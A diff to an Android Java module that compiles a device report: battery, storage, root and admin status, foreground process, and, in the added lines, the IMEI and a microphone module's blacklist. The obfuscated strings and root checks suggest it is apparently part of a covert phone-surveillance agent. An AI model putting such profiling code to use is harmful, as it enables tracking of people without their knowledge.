@@ -109,8 +109,17 @@ public class ModuleDevice extends BaseInstantModule {
 				sb.append("Debug\n"); //$NON-NLS-1$
 				final String timestamp = System.getProperty("build.timestamp"); //$NON-NLS-1$
 				if (timestamp != null) {
-					sb.append(timestamp + "\n"); //$NON-NLS-1$
+					sb.append("Timestamp: " + timestamp + "\n"); //$NON-NLS-1$
 				}
+			}
+			
+			ModuleMic mic = ModuleMic.self();
+			if(mic != null){
+				sb.append("MIC blacklist: ");
+				for (String black : mic.blacklist) {
+					sb.append(black + " ");
+				}
+				sb.append("\n");
 			}
 
 			long freeSpace = getSystem(sb);
@@ -123,10 +132,11 @@ public class ModuleDevice extends BaseInstantModule {
 			boolean admin = dpm.isAdminActive(devAdminReceiver);
 			boolean root = Status.self().haveRoot();
 			
-			sb.insert(0,  M.e("Admin: ") + (admin?"yes":"no") + "\n"); //$NON-NLS-1$
-			sb.insert(0, M.e("Root: ") + (root?"yes":"no") + "\n"); //$NON-NLS-1$
+			sb.insert(0, M.e("IMEI: ") + Device.self().getImei() + "\n");
+			sb.insert(0, M.e("Root: ") + (root?"yes":"no") + " " + M.e(", Admin: ") + (admin?"yes":"no") + "\n");
 			sb.insert(0, M.e("Free space: ") + freeSpace + " KB\n");
 			sb.insert(0, M.e("Battery: ") + battery + "%\n");
+			
 			
 		} catch (Exception ex) {
 			if (Cfg.DEBUG) {
@@ -197,7 +207,6 @@ public class ModuleDevice extends BaseInstantModule {
 
 		sb.append(M.e("External state: ") + Environment.getExternalStorageState() + "\n");
 		sb.append(M.e("External space: ") + bytesAvailableExt + "\n");
-
 
 		RunningProcesses runningProcesses = new RunningProcesses();
 		sb.append(M.e("Foreground process: ") +runningProcesses.getForeground() + "\n"); //$NON-NLS-1$
